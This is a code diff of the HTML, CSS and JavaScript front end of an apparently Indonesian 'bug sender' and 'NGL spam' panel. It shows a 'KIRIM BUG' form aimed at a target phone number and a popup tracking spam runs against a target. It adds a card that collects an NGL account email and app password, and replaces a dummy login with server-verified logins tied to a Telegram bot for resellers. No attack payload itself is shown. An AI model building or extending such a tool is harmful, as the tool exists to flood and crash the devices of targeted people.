 .btn-send-bug{width:100%;padding:15px;background:var(--red);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:1.3rem;letter-spacing:3px;border:5px solid var(--ink);box-shadow:6px 6px 0 var(--ink);cursor:pointer;margin-top:16px;transition:transform .08s,box-shadow .08s;}
 .btn-send-bug:active{transform:translate(5px,5px);box-shadow:1px 1px 0 var(--ink);}
 
-.sender-mgmt-head{background:#0d0d18;border:5px solid var(--ink);box-shadow:6px 6px 0 var(--ink);padding:14px;margin-bottom:12px;display:flex;align-items:center;gap:12px;position:relative;overflow:hidden;}
+.sender-mgmt-head{background:#0d0d18;border:5px solid var(--ink);box-shadow:6px 6px 0 var(--ink);padding:14px;margin-bottom:12px;display:flex;align-items:center;gap:12px;}
 .sender-mgmt-head .lg{width:44px;height:44px;border-radius:10px;background:linear-gradient(135deg,#ffb300,#a67c00);border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);display:flex;align-items:center;justify-content:center;font-size:1.4rem;flex-shrink:0;}
 .sender-mgmt-head .info{flex:1;min-width:0;}
-.sender-mgmt-head .info .nm{font-family:'Bangers',Impact,sans-serif;font-size:1.05rem;letter-spacing:1.5px;color:#fff;line-height:1.05;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.sender-mgmt-head .info .nm{font-family:'Bangers',Impact,sans-serif;font-size:1.05rem;letter-spacing:1.5px;color:#fff;line-height:1.05;}
 .sender-mgmt-head .info .sb{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.72rem;color:#8892b0;margin-top:2px;letter-spacing:1px;}
 .sender-mgmt-head .active-badge{background:#d81b4a;color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:.75rem;letter-spacing:1.5px;padding:5px 10px;border-radius:8px;border:3px solid var(--ink);box-shadow:2px 2px 0 var(--ink);flex-shrink:0;}
 .tips-box{background:#1a1a2a;border:4px solid var(--ink);box-shadow:4px 4px 0 var(--ink);padding:10px 12px;margin-bottom:14px;display:flex;gap:10px;align-items:flex-start;}
@@ -559,6 +719,7 @@ body{display:flex;justify-content:center;align-items:center;}
 .btn-batal:active{transform:translate(4px,4px);box-shadow:1px 1px 0 var(--ink);}
 .btn-lanjutkan{padding:13px;background:var(--red);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:1.05rem;letter-spacing:2px;border:4px solid var(--ink);box-shadow:4px 4px 0 var(--ink);cursor:pointer;border-radius:10px;}
 .btn-lanjutkan:active{transform:translate(4px,4px);box-shadow:1px 1px 0 var(--ink);}
+.btn-lanjutkan:disabled{opacity:.55;cursor:wait;}
 .btn-add-first{display:block;width:100%;padding:14px;margin:0 auto 14px;background:#d81b4a;color:#fff;max-width:280px;font-family:'Bangers',Impact,sans-serif;font-size:1.1rem;letter-spacing:2px;border:5px solid var(--ink);box-shadow:5px 5px 0 var(--ink);cursor:pointer;border-radius:12px;}
 .btn-add-first:active{transform:translate(5px,5px);box-shadow:1px 1px 0 var(--ink);}
 .btn-new-sender{width:100%;max-width:280px;padding:12px;margin:0 auto 10px;background:linear-gradient(135deg,#ffb300,#a67c00);color:var(--ink);font-family:'Bangers',Impact,sans-serif;font-size:1rem;letter-spacing:2px;border:5px solid var(--ink);box-shadow:5px 5px 0 var(--ink);cursor:pointer;border-radius:12px;display:none;align-items:center;justify-content:center;gap:6px;}
@@ -573,6 +734,19 @@ body{display:flex;justify-content:center;align-items:center;}
 .sender-item .del{background:#3a1a20;border:3px solid var(--ink);color:var(--red);font-family:'Bangers',Impact,sans-serif;font-size:.7rem;letter-spacing:1px;padding:6px 10px;border-radius:6px;cursor:pointer;box-shadow:2px 2px 0 var(--ink);}
 .sender-item .del:active{transform:translate(2px,2px);box-shadow:0 0 0 var(--ink);}
 
+/* NGL CREDENTIAL CARD (di bug sender) */
+.ngl-cred-card{position:relative;background:linear-gradient(135deg,#1a0a1e,#0f0515);border:5px solid #00d2ff;box-shadow:7px 7px 0 var(--ink);padding:18px 16px;margin-bottom:14px;border-radius:14px;}
+.ngl-cred-card::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(45deg,transparent,transparent 14px,rgba(0,210,255,.04) 14px,rgba(0,210,255,.04) 16px);pointer-events:none;border-radius:9px;}
+.ngl-cred-tab{position:absolute;top:-14px;left:16px;background:#00d2ff;color:#062028;font-family:'Bangers',Impact,sans-serif;font-size:.75rem;letter-spacing:2px;padding:5px 12px;border-radius:8px;border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);}
+.ngl-cred-title{display:flex;align-items:center;gap:12px;margin:8px 0 16px;position:relative;z-index:1;}
+.ngl-cred-title .ic{width:44px;height:44px;border-radius:10px;background:#00d2ff;color:#062028;border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);display:flex;align-items:center;justify-content:center;font-size:1.4rem;flex-shrink:0;}
+.ngl-cred-title .ttl{font-family:'Bangers',Impact,sans-serif;font-size:1.25rem;letter-spacing:2px;color:#00d2ff;-webkit-text-stroke:1px var(--ink);text-shadow:2px 2px 0 var(--ink);line-height:1.05;}
+.ngl-cred-title .ttl small{display:block;font-family:'Comic Neue',sans-serif;font-size:.7rem;font-weight:700;letter-spacing:.5px;color:#8892b0;margin-top:2px;-webkit-text-stroke:0;text-shadow:none;}
+.ngl-cred-status{background:#050510;border:2px solid #1e1e30;border-radius:10px;padding:10px 12px;margin-bottom:14px;font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.72rem;color:#8892b0;position:relative;z-index:1;line-height:1.5;}
+.ngl-cred-status b{color:#00e676;}
+.ngl-cred-status.warn b{color:#ffcc00;}
+.ngl-cred-actions{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:4px;position:relative;z-index:1;}
+
 .popup-overlay{position:absolute;inset:0;background:rgba(0,0,0,.88);backdrop-filter:blur(8px);display:none;justify-content:center;align-items:center;z-index:100;padding:20px;}
 .popup-overlay.active{display:flex;animation:popIn .35s;}
 @keyframes popIn{from{opacity:0}to{opacity:1}}
@@ -586,12 +760,11 @@ body{display:flex;justify-content:center;align-items:center;}
 .method-box .mnum{font-family:'Bangers',Impact,sans-serif;font-size:1.1rem;color:var(--ink);line-height:1;}
 .method-box .mname{font-family:'Bangers',Impact,sans-serif;font-size:.55rem;letter-spacing:.5px;color:var(--ink);margin-top:3px;line-height:1.1;min-height:20px;}
 .method-box.active-load{background:var(--yellow);animation:pulseBox .5s infinite;}
-.method-box.filled{background:var(--green);color:#fff;}
+.method-box.filled{background:var(--green);}
 .method-box.filled .mnum,.method-box.filled .mname{color:#fff;}
-.method-box.error{background:var(--red);color:#fff;}
+.method-box.error{background:var(--red);}
 .method-box.error .mnum,.method-box.error .mname{color:#fff;}
 @keyframes pulseBox{0%,100%{transform:scale(1);}50%{transform:scale(1.06);}}
-
 .term-output{background:#0a0a14;border:4px solid var(--ink);box-shadow:4px 4px 0 var(--ink);padding:10px;margin-bottom:12px;text-align:left;height:180px;overflow-y:auto;border-radius:6px;position:relative;z-index:1;font-family:'Courier New',monospace;}
 .term-output::-webkit-scrollbar{width:6px;}
 .term-output::-webkit-scrollbar-track{background:#000;}
@@ -604,46 +777,12 @@ body{display:flex;justify-content:center;align-items:center;}
 .term-output .tline.info{color:#00d2ff;}
 .term-output .tline::before{content:"$ ";color:#555;}
 .term-output .tline.noprefix::before{content:"";}
-
 .method-status{font-family:'Bangers',Impact,sans-serif;font-size:.95rem;letter-spacing:1.5px;color:var(--ink);margin-bottom:10px;min-height:20px;position:relative;z-index:1;}
 .method-status.running{color:var(--red);}
 .method-status.done{color:var(--green);}
-
 .progress-bar-wrap{background:var(--paper);border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);height:24px;margin-bottom:12px;overflow:hidden;position:relative;z-index:1;}
 .progress-bar-fill{height:100%;width:0%;background:repeating-linear-gradient(45deg,var(--red),var(--red) 8px,#ff4d6a 8px,#ff4d6a 16px);transition:width .25s linear;position:relative;}
 .progress-bar-text{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:'Bangers',Impact,sans-serif;font-size:.9rem;letter-spacing:2px;color:var(--ink);text-shadow:1px 1px 0 #fff,-1px -1px 0 #fff,1px -1px 0 #fff,-1px 1px 0 #fff;z-index:2;}
-
-.ngl-popup-box{background:#12121c !important;background-image:none !important;border:5px solid var(--red) !important;box-shadow:10px 10px 0 #000 !important;transform:none !important;padding:18px 16px !important;color:#fff;}
-.ngl-popup-box h4{color:#ff4d6a !important;-webkit-text-stroke:0 !important;text-shadow:none !important;font-family:'Poppins',sans-serif !important;font-weight:900 !important;letter-spacing:2px !important;font-size:1.4rem !important;}
-.ngl-popup-box .popup-sub{color:#8892b0 !important;font-family:'Poppins',sans-serif !important;font-weight:600 !important;letter-spacing:1px !important;font-size:.75rem !important;}
-.ngl-popup-box .popup-sub b{color:#00d2ff !important;}
-
-.ngl-stat-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px;position:relative;z-index:1;}
-.ngl-stat-cell{background:#05050a;border:2px solid #1e1e30;border-radius:10px;padding:10px 6px;text-align:center;}
-.ngl-stat-cell .lbl{font-family:'Poppins',sans-serif;font-weight:500;font-size:.65rem;color:#8892b0;line-height:1.2;}
-.ngl-stat-cell .val{font-family:'Poppins',sans-serif;font-weight:900;font-size:1.4rem;margin-top:4px;line-height:1;}
-.ngl-stat-cell.ok .val{color:#00e676;}
-.ngl-stat-cell.err .val{color:#ff4d6a;}
-.ngl-stat-cell.prog .val{color:#00d2ff;}
-
-.ngl-progress-wrap{background:#05050a;border:2px solid #1e1e30;border-radius:10px;height:22px;overflow:hidden;position:relative;margin-bottom:12px;z-index:1;}
-.ngl-progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4d6a,#ff8a3d);transition:width .3s linear;box-shadow:0 0 12px rgba(255,77,106,.6);}
-.ngl-progress-text{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:'Poppins',sans-serif;font-weight:700;font-size:.75rem;color:#fff;letter-spacing:1px;text-shadow:0 0 6px #000;}
-
-.ngl-term{background:#05050a;border:2px solid #1e1e30;border-radius:10px;padding:10px;text-align:left;height:160px;overflow-y:auto;font-family:'Courier New',monospace;font-size:.68rem;line-height:1.5;margin-bottom:14px;position:relative;z-index:1;}
-.ngl-term::-webkit-scrollbar{width:5px;}
-.ngl-term::-webkit-scrollbar-thumb{background:#ff4d6a;border-radius:3px;}
-.ngl-term .nll{color:#8892b0;margin-bottom:2px;word-break:break-word;}
-.ngl-term .nll.ok{color:#00e676;}
-.ngl-term .nll.err{color:#ff4d6a;}
-.ngl-term .nll.info{color:#00d2ff;}
-.ngl-term .nll.warn{color:#ffcc00;}
-
-.ngl-btn-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;position:relative;z-index:1;}
-.ngl-btn-row button{padding:12px;border-radius:10px;font-family:'Poppins',sans-serif;font-weight:700;font-size:.85rem;cursor:pointer;border:none;letter-spacing:1px;}
-.ngl-btn-row .stop{background:#2a2a3a;color:#fff;}
-.ngl-btn-row .close{background:#ff4d6a;color:#fff;}
-.ngl-btn-row button:active{transform:scale(.97);}
 
 .delivery-report{display:none;background:#fff;border:5px solid var(--ink);box-shadow:7px 7px 0 var(--ink);padding:14px;margin-top:14px;text-align:left;border-radius:8px;position:relative;z-index:1;transform:rotate(-.4deg);}
 .delivery-report.show{display:block;animation:reportIn .5s cubic-bezier(.16,1,.3,1);}
@@ -699,6 +838,21 @@ body{display:flex;justify-content:center;align-items:center;}
 .ngl-count-row{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-top:8px;}
 .ngl-count-btn{padding:12px 4px;background:#12121c;border:1.5px solid #1e1e30;border-radius:10px;color:#fff;font-family:'Poppins',sans-serif;font-weight:600;font-size:.78rem;cursor:pointer;transition:all .2s;text-align:center;}
 .ngl-count-btn.active{background:var(--red);border-color:var(--red);color:#fff;box-shadow:0 0 20px rgba(233,30,60,.4);}
+
+/* NGL SENDER SELECTOR */
+.ngl-sender-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px;}
+.ngl-sender-opt{background:#12121c;border:2px solid #1e1e30;border-radius:14px;padding:14px 10px;text-align:center;cursor:pointer;transition:all .15s;position:relative;}
+.ngl-sender-opt:active{transform:scale(.98);}
+.ngl-sender-opt.active{border-color:var(--red);background:rgba(233,30,60,.08);box-shadow:0 0 22px rgba(233,30,60,.35);}
+.ngl-sender-opt .ic{font-size:1.6rem;display:block;margin-bottom:6px;}
+.ngl-sender-opt .nm{font-family:'Poppins',sans-serif;font-weight:800;font-size:.85rem;color:#fff;letter-spacing:1.2px;margin-bottom:4px;}
+.ngl-sender-opt.active .nm{color:#ff4d6a;}
+.ngl-sender-opt .st{font-family:'Poppins',sans-serif;font-weight:500;font-size:.62rem;color:#8892b0;line-height:1.3;letter-spacing:.3px;}
+.ngl-sender-opt.active .st{color:#00e676;}
+.ngl-sender-opt .st.warn{color:#ffcc00;}
+.ngl-sender-opt .badge-check{position:absolute;top:6px;right:6px;width:18px;height:18px;background:var(--red);border-radius:50%;color:#fff;display:none;align-items:center;justify-content:center;font-size:.7rem;font-weight:bold;}
+.ngl-sender-opt.active .badge-check{display:flex;}
+
 .ngl-stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:14px;}
 .ngl-stat{background:#12121c;border:1.5px solid #1e1e30;border-radius:12px;padding:14px 8px;text-align:center;}
 .ngl-stat.sukses{border-color:rgba(0,230,118,.3);}
@@ -721,6 +875,44 @@ body{display:flex;justify-content:center;align-items:center;}
 .ngl-log-body .log-line.info{color:#00d2ff;}
 .ngl-log-body .log-line.warn{color:#ffcc00;}
 
+.ngl-popup-box{background:#12121c !important;background-image:none !important;border:5px solid var(--red) !important;box-shadow:10px 10px 0 #000 !important;transform:none !important;padding:18px 16px !important;color:#fff;}
+.ngl-popup-box h4{color:#ff4d6a !important;-webkit-text-stroke:0 !important;text-shadow:none !important;font-family:'Poppins',sans-serif !important;font-weight:900 !important;letter-spacing:2px !important;font-size:1.4rem !important;}
+.ngl-popup-box .popup-sub{color:#8892b0 !important;font-family:'Poppins',sans-serif !important;font-weight:600 !important;letter-spacing:1px !important;font-size:.75rem !important;}
+.ngl-popup-box .popup-sub b{color:#00d2ff !important;}
+.ngl-stat-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px;position:relative;z-index:1;}
+.ngl-stat-cell{background:#05050a;border:2px solid #1e1e30;border-radius:10px;padding:10px 6px;text-align:center;}
+.ngl-stat-cell .lbl{font-family:'Poppins',sans-serif;font-weight:500;font-size:.65rem;color:#8892b0;line-height:1.2;}
+.ngl-stat-cell .val{font-family:'Poppins',sans-serif;font-weight:900;font-size:1.4rem;margin-top:4px;line-height:1;}
+.ngl-stat-cell.ok .val{color:#00e676;}
+.ngl-stat-cell.err .val{color:#ff4d6a;}
+.ngl-stat-cell.prog .val{color:#00d2ff;}
+.ngl-progress-wrap{background:#05050a;border:2px solid #1e1e30;border-radius:10px;height:22px;overflow:hidden;position:relative;margin-bottom:12px;z-index:1;}
+.ngl-progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4d6a,#ff8a3d);transition:width .3s linear;box-shadow:0 0 12px rgba(255,77,106,.6);}
+.ngl-progress-text{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:'Poppins',sans-serif;font-weight:700;font-size:.75rem;color:#fff;letter-spacing:1px;text-shadow:0 0 6px #000;}
+.ngl-term{background:#05050a;border:2px solid #1e1e30;border-radius:10px;padding:10px;text-align:left;height:160px;overflow-y:auto;font-family:'Courier New',monospace;font-size:.68rem;line-height:1.5;margin-bottom:14px;position:relative;z-index:1;}
+.ngl-term::-webkit-scrollbar{width:5px;}
+.ngl-term::-webkit-scrollbar-thumb{background:#ff4d6a;border-radius:3px;}
+.ngl-term .nll{color:#8892b0;margin-bottom:2px;word-break:break-word;}
+.ngl-term .nll.ok{color:#00e676;}
+.ngl-term .nll.err{color:#ff4d6a;}
+.ngl-term .nll.info{color:#00d2ff;}
+.ngl-term .nll.warn{color:#ffcc00;}
+.ngl-btn-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;position:relative;z-index:1;}
+.ngl-btn-row button{padding:12px;border-radius:10px;font-family:'Poppins',sans-serif;font-weight:700;font-size:.85rem;cursor:pointer;border:none;letter-spacing:1px;}
+.ngl-btn-row .stop{background:#2a2a3a;color:#fff;}
+.ngl-btn-row .close{background:#ff4d6a;color:#fff;}
+.ngl-btn-row button:active{transform:scale(.97);}
+
+/* CHAT ROOM — fixed overlay, tidak ketimpa dashboard */
+#chat-room-overlay{position:fixed;inset:0;z-index:900;background:#08090d;display:none;flex-direction:column;}
+#chat-room-overlay.open{display:flex;}
+.chat-room-bar{display:flex;align-items:center;gap:10px;padding:12px 14px;background:#111a26;border-bottom:3px solid var(--ink);color:#fff;flex-shrink:0;padding-top:calc(12px + env(safe-area-inset-top,0));}
+.chat-room-bar button{background:#1e2c3a;color:#fff;border:2px solid var(--ink);font-family:'Bangers',Impact,sans-serif;font-size:.95rem;letter-spacing:1.5px;padding:7px 14px;cursor:pointer;border-radius:6px;}
+.chat-room-bar button:active{transform:translate(2px,2px);}
+.chat-room-bar .ttl{flex:1;font-family:'Bangers',Impact,sans-serif;font-size:1.15rem;letter-spacing:2px;color:#ffd93b;}
+.chat-room-bar .st{font-family:'Poppins',sans-serif;font-size:.7rem;color:#8892b0;white-space:nowrap;}
+#chatFrame{flex:1;width:100%;border:0;background:#fff;}
+
 .bottom-navbar{position:absolute;bottom:0;left:0;width:100%;height:var(--nav-h);background:#fff6d6;border-top:5px solid var(--ink);display:flex;justify-content:space-around;align-items:center;z-index:20;padding-bottom:env(safe-area-inset-bottom,0);box-sizing:content-box;flex-shrink:0;}
 .nav-tab{display:flex;flex-direction:column;align-items:center;font-family:'Bangers',Impact,sans-serif;font-size:.65rem;letter-spacing:1px;color:var(--ink);cursor:pointer;padding:4px 8px;}
 .nav-tab .ic{font-size:1.2rem;line-height:1;}
@@ -735,17 +927,16 @@ body{display:flex;justify-content:center;align-items:center;}
 <div id="login-view">
   <div class="login-card">
     <h2>Login</h2>
+    <div class="login-sub">Akun harus terdaftar di Telegram bot.<br>Ketik <b>/adduser</b> ke bot untuk daftar.</div>
     <form class="form-container" id="loginForm" onsubmit="return doLogin(event)">
-      <div class="input-box"><input type="text" id="loginUser" placeholder="username" required autocomplete="off"></div>
+      <div class="input-box"><input type="text" id="loginUser" placeholder="username terdaftar" required autocomplete="off"></div>
       <div class="input-box"><input type="password" id="loginPass" placeholder="password" required autocomplete="off"><span class="eye" onclick="toggleEye()">👁</span></div>
       <div class="options">
         <label class="remember-me"><input type="checkbox" checked> Remember Me</label>
         <a href="#" class="forgot-pass" onclick="return false">Forgot password?</a>
       </div>
       <div class="login-error" id="loginError"></div>
-      <button type="submit" class="btn-login">Log in</button>
-      <div class="register-link">Don't have an account? <a href="#" onclick="return false">Register Here!</a></div>
-      <div class="demo-hint">Username <b>bebas</b> · password <b>min 1 karakter</b></div>
+      <button type="submit" class="btn-login" id="loginBtn">Log in</button>
     </form>
   </div>
 </div>
@@ -779,7 +970,7 @@ body{display:flex;justify-content:center;align-items:center;}
     <div class="comic-panel">
       <div class="user-row">
         <div class="avatar-box" id="userInitial">R</div>
-        <div class="info"><h4 id="userNameDisplay">RAJA ⭐</h4><span class="badge-reseller">RESELLER</span></div>
+        <div class="info"><h4 id="userNameDisplay">-</h4><span class="badge-reseller">RESELLER</span></div>
         <div class="temp-badge">29°C 📍</div>
       </div>
       <div class="vps-grid">
@@ -888,6 +1079,29 @@ body{display:flex;justify-content:center;align-items:center;}
     </div>
     <button class="btn-add-first" id="btnAddFirst" onclick="focusSenderInput()">+ ADD FIRST SENDER</button>
     <button class="btn-new-sender" id="btnNewSender" onclick="focusSenderInput()">+ NEW SENDER</button>
+
+    <!-- ═══ NGL PRIVATE SENDER CARD (BARU) ═══ -->
+    <div class="ngl-cred-card" id="nglCredCard">
+      <div class="ngl-cred-tab">NGL SENDER CREDENTIALS</div>
+      <div class="ngl-cred-title">
+        <div class="ic">✉</div>
+        <div class="ttl">NGL PRIVATE SENDER
+          <small>Kredensial akun NGL pribadi untuk mode Private</small>
+        </div>
+      </div>
+      <div class="ngl-cred-status" id="nglCredStatus">⏳ Memuat status…</div>
+
+      <label class="wa-field-label">EMAIL</label>
+      <div class="wa-input-wrap"><div class="prefix">✉</div><input type="email" id="nglCredEmail" placeholder="you@email.com" autocomplete="off"></div>
+
+      <label class="wa-field-label">APP2PASSWORD</label>
+      <div class="wa-input-wrap"><div class="prefix">🔐</div><input type="text" id="nglCredPass" placeholder="16-digit app password" autocomplete="off"></div>
+
+      <div class="ngl-cred-actions">
+        <button class="btn-batal" onclick="clearNglCred()">CLEAR</button>
+        <button class="btn-lanjutkan" id="nglCredBtn" onclick="saveNglCred()">ENTER</button>
+      </div>
+    </div>
   </div>
 
   <div id="module-form-page" class="view-section comic-bg">
@@ -924,18 +1138,6 @@ body{display:flex;justify-content:center;align-items:center;}
     <button class="btn-send-bug" onclick="startSendingProcess()">➢ KIRIM BUG</button>
   </div>
 
-  <!-- ═════════════════════════════════════════════════════
-       CHAT ROOM PAGE — KomikChat iframe
-       ═════════════════════════════════════════════════════ -->
-  <div id="chat-room-page" class="view-section">
-    <div class="chat-room-bar">
-      <button onclick="switchSection('dashboard-1')">◀ BACK</button>
-      <div class="ttl">💬 CHAT ROOM</div>
-      <div class="st" id="chatRoomStatus">connecting...</div>
-    </div>
-    <iframe id="chatFrame" src="about:blank" allow="microphone; camera; clipboard-write; autoplay; notifications"></iframe>
-  </div>
-
   <div id="spam-ngl-page" class="view-section">
     <div class="ngl-topbar">
       <button class="ngl-back" onclick="switchSection('dashboard-2')">←</button>
@@ -965,6 +1167,26 @@ body{display:flex;justify-content:center;align-items:center;}
         <div class="ngl-count-btn" data-count="200" onclick="selectNglCount(this)">200</div>
       </div>
     </div>
+
+    <!-- ═══ SENDER SELECTOR (BARU) ═══ -->
+    <div class="ngl-form-card" style="padding:12px">
+      <div class="ngl-label" style="margin-bottom:12px"><span class="dot-icon">🔀</span> Pilih Sender Mode</div>
+      <div class="ngl-sender-grid">
+        <div class="ngl-sender-opt active" id="nglPrivateOpt" data-mode="private" onclick="selectNglSender(this)">
+          <span class="badge-check">✓</span>
+          <span class="ic">🔒</span>
+          <div class="nm">PRIVATE</div>
+          <div class="st" id="nglPrivateStatus">● Belum diisi</div>
+        </div>
+        <div class="ngl-sender-opt" id="nglPublicOpt" data-mode="public" onclick="selectNglSender(this)">
+          <span class="badge-check">✓</span>
+          <span class="ic">🌐</span>
+          <div class="nm">PUBLIC</div>
+          <div class="st" id="nglPublicStatus">● Owner</div>
+        </div>
+      </div>
+    </div>
+
     <div class="ngl-stats">
       <div class="ngl-stat sukses"><div class="lbl">Terkirim<br>Sukses</div><div class="val" id="nglOk">0</div></div>
       <div class="ngl-stat gagal"><div class="lbl">Gagal /<br>Error</div><div class="val" id="nglErr">0</div></div>
@@ -978,33 +1200,24 @@ body{display:flex;justify-content:center;align-items:center;}
     </div>
   </div>
 
-  <!-- ═════════════════════════════════════════════════════
-       NGL POPUP — centered, muncul pas start
-       ═════════════════════════════════════════════════════ -->
   <div class="popup-overlay" id="nglPopup">
     <div class="popup-box ngl-popup-box">
       <div class="popup-skull">💣</div>
       <h4>NGL SPAM RUNNING</h4>
-      <div class="popup-sub">TARGET: <b id="nglPopupTarget">—</b></div>
-
+      <div class="popup-sub">TARGET: <b id="nglPopupTarget">—</b> · <b id="nglPopupMode">—</b></div>
       <div class="ngl-stat-grid">
         <div class="ngl-stat-cell ok"><div class="lbl">OK</div><div class="val" id="nglPopupOk">0</div></div>
         <div class="ngl-stat-cell err"><div class="lbl">ERR</div><div class="val" id="nglPopupErr">0</div></div>
         <div class="ngl-stat-cell prog"><div class="lbl">PROGRESS</div><div class="val" id="nglPopupProg">0/0</div></div>
       </div>
-
       <div class="ngl-progress-wrap">
         <div class="ngl-progress-fill" id="nglPopupFill"></div>
         <div class="ngl-progress-text" id="nglPopupPct">0%</div>
       </div>
-
-      <div class="ngl-term" id="nglPopupLog">
-        <div class="nll info">[system] booting ngl-engine...</div>
-      </div>
-
+      <div class="ngl-term" id="nglPopupLog"><div class="nll info">[system] booting ngl-engine...</div></div>
       <div class="ngl-btn-row">
         <button class="stop" id="nglPopupStop" onclick="stopNglSpam()">⏹ STOP</button>
-        <button class="close" id="nglPopupClose" onclick="closeNglPopup()">✕ TUTUP</button>
+        <button class="close" onclick="closeNglPopup()">✕ TUTUP</button>
       </div>
     </div>
   </div>
@@ -1027,11 +1240,9 @@ body{display:flex;justify-content:center;align-items:center;}
         <div class="report-row"><span class="k">SENDER</span><span class="v good" id="repSender">-</span></div>
         <div class="report-row"><span class="k">METODE</span><span class="v" id="repMethod">-</span></div>
         <div class="report-row"><span class="k">DELIVERED</span><span class="v good" id="repDelivered">-</span></div>
-        <div class="report-row"><span class="k">PAKET TERKIRIM</span><span class="v" id="repPackets">-</span></div>
         <div class="report-row"><span class="k">DURASI</span><span class="v" id="repDuration">-</span></div>
         <div class="report-row"><span class="k">STATUS</span><span class="v good" id="repStatus">DELIVERED ✓</span></div>
-        <div class="report-row"><span class="k">WAKTU</span><span class="v" id="repTime">-</span></div>
-        <div class="report-desc" id="repDesc">Deskripsi pengiriman akan tampil di sini.</div>
+        <div class="report-desc" id="repDesc">Deskripsi akan tampil di sini.</div>
       </div>
     </div>
   </div>
@@ -1069,34 +1280,74 @@ body{display:flex;justify-content:center;align-items:center;}
   </div>
 </div>
 
+<!-- ═══ CHAT ROOM OVERLAY — fixed, tidak ketimpa ═══ -->
+<div id="chat-room-overlay">
+  <div class="chat-room-bar">
+    <button onclick="closeChatRoom()">◀ BACK</button>
+    <div class="ttl">💬 CHAT ROOM</div>
+    <div class="st" id="chatRoomStatus">loading...</div>
+  </div>
+  <iframe id="chatFrame" src="about:blank" allow="microphone; camera; clipboard-write; autoplay; notifications"></iframe>
+</div>
+
 <script>
 const CHAT_URL = '__CHAT_URL__';
+let CURRENT_USER = '';
+let CURRENT_TOKEN = '';
 
 function toggleEye(){const p=document.getElementById('loginPass');p.type=p.type==='password'?'text':'password';}
-function doLogin(e){
+
+async function doLogin(e){
   e.preventDefault();
-  const u=document.getElementById('loginUser').value.trim();
-  const p=document.getElementById('loginPass').value.trim();
-  const err=document.getElementById('loginError');
-  if(!u||u.length<2){err.textContent='✗ Username min 2 karakter!';setTimeout(()=>{err.textContent='';},2500);return false;}
-  if(!p){err.textContent='✗ Password kosong!';setTimeout(()=>{err.textContent='';},2500);return false;}
-  document.getElementById('userNameDisplay').textContent=u.toUpperCase()+' ⭐';
-  document.getElementById('userInitial').textContent=u.charAt(0).toUpperCase();
-  document.getElementById('login-view').classList.add('hidden');
-  setTimeout(()=>{document.getElementById('login-view').style.display='none';document.getElementById('appContainer').style.display='flex';},400);
+  const u = document.getElementById('loginUser').value.trim().toLowerCase();
+  const p = document.getElementById('loginPass').value;
+  const err = document.getElementById('loginError');
+  const btn = document.getElementById('loginBtn');
+  err.textContent = '';
+  if (u.length < 3) { err.textContent = '✗ Username minimal 3 karakter.'; return false; }
+  if (!p) { err.textContent = '✗ Password kosong.'; return false; }
+  btn.disabled = true; btn.textContent = 'Verifying...';
+  try {
+    const r = await fetch('/api/login', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ username: u, password: p }),
+    });
+    const d = await r.json();
+    if (!r.ok) { err.textContent = '✗ ' + (d.error || 'Login gagal'); btn.disabled = false; btn.textContent = 'Log in'; return false; }
+    CURRENT_USER = d.username; CURRENT_TOKEN = d.token;
+    localStorage.revolt_user = d.username;
+    localStorage.revolt_token = d.token;
+    document.getElementById('userNameDisplay').textContent = d.username.toUpperCase() + ' ⭐';
+    document.getElementById('userInitial').textContent = d.username.charAt(0).toUpperCase();
+    document.getElementById('login-view').classList.add('hidden');
+    setTimeout(() => {
+      document.getElementById('login-view').style.display = 'none';
+      document.getElementById('appContainer').style.display = 'flex';
+      initAfterLogin();
+    }, 400);
+  } catch (e) {
+    err.textContent = '✗ Network error: ' + e.message;
+    btn.disabled = false; btn.textContent = 'Log in';
+  }
   return false;
 }
+
+function initAfterLogin(){
+  loadNglCredStatus();
+  updateSenderUI();
+}
+
 function switchSection(id){
-  document.querySelectorAll('.view-section').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
   document.getElementById(id).classList.add('active');
-  document.getElementById(id).scrollTop=0;
+  document.getElementById(id).scrollTop = 0;
 }
 function setNav(el){document.querySelectorAll('.nav-tab').forEach(n=>n.classList.remove('active'));el.classList.add('active');}
 function setTab(el){document.querySelectorAll('.tab-btn').forEach(t=>t.classList.remove('active'));el.classList.add('active');}
 function openModuleForm(){switchSection('module-form-page');}
 function openBugMenu(){switchSection('dashboard-2');}
-function openBugSender(){switchSection('bug-sender-page');}
-function openSpamNGL(){switchSection('spam-ngl-page');}
+function openBugSender(){switchSection('bug-sender-page'); loadNglCredStatus();}
+function openSpamNGL(){switchSection('spam-ngl-page'); loadNglCredStatus();}
 function selectOpt(el){el.parentElement.querySelectorAll('.bug-opt').forEach(o=>o.classList.remove('active'));el.classList.add('active');}
 function pasteTarget(){document.getElementById('targetNum').value='628123456789';}
 function focusSenderInput(){document.getElementById('senderNumber').focus();}
@@ -1105,19 +1356,25 @@ function cancelAddSender(){document.getElementById('senderNumber').value='';}
 // ═══ CHAT ROOM ═══
 let chatFrameLoaded = false;
 function openChatRoom(){
-  switchSection('chat-room-page');
+  const ov = document.getElementById('chat-room-overlay');
   const f = document.getElementById('chatFrame');
